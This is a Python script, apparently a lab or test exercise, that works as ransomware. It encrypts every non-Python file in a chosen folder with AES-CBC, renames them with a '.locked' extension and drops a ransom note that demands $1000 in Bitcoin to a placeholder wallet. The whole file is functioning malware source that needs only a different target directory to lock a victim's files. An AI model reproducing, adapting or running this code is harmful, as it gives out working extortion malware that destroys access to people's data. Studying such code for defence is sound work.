import os
from Crypto.Cipher import AES

# Directory to encrypt (Change this to your test folder)
directory = r"C:\Users\shrad\test_folder"

# Generate AES key and IV (save for decryption)
def generate_key():
    key = os.urandom(16)  # 16-byte key for AES
    iv = os.urandom(16)   # 16-byte IV
    with open("aes_key.bin", "wb") as key_file:
        key_file.write(key + iv)
    return key, iv

# Encrypt a file
def encrypt_file(file_path, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    # Read file data
    with open(file_path, "rb") as f:
        file_data = f.read()

    # Padding to make data a multiple of 16 bytes
    padding_length = 16 - (len(file_data) % 16)
    file_data += bytes([padding_length] * padding_length)

    # Encrypt the data
    encrypted_data = cipher.encrypt(file_data)

    # Write encrypted data back
    with open(file_path, "wb") as f:
        f.write(encrypted_data)

    # Rename file with ".locked" extension
    os.rename(file_path, file_path + ".locked")

# Display ransom note
def create_ransom_note(directory):
    ransom_text = """
    🔐 YOUR FILES HAVE BEEN ENCRYPTED 🔐
    
    Your files are now locked and cannot be accessed.
    If you want to recover them, send $1000 in Bitcoin to our wallet.
    
    Once the payment is made, you will receive a decryption tool.

    💰 BTC Wallet: 1FakeWalletAddressXYZ 💰
    
    """
    note_path = os.path.join(directory, "READ_THIS.txt")
    with open(note_path, "w", encoding="utf-8") as note:  # Fix for Unicode error
        note.write(ransom_text)

# Encrypt all files in a folder (excluding the script itself)
def encrypt_files(directory):
    key, iv = generate_key()

    for file in os.listdir(directory):
        file_path = os.path.join(directory, file)

        # Ignore Python files and key file
        if os.path.isfile(file_path) and not file.endswith((".py", "aes_key.bin")):
            encrypt_file(file_path, key, iv)

    # Create ransom note
    create_ransom_note(directory)
    print("🔒 Files encrypted successfully! Ransom note created.")

# Run encryption
if __name__ == "__main__":
    encrypt_files(directory)
